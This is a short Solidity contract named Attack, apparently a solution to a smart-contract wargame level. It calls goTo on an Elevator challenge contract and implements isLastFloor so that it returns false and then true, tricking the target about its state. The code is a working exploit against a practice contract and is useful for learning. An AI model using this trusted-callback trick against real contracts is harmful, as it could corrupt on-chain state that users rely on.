// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level11.sol";

contract Attack {
    bool public switchBoolean;

    function attackElevator(address _instance) external {
        Elevator instance = Elevator(_instance);
        instance.goTo(1);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (switchBoolean) {
            switchBoolean = false;
            return true;
        } else {
            switchBoolean = true;
            return false;
        }
    }
}
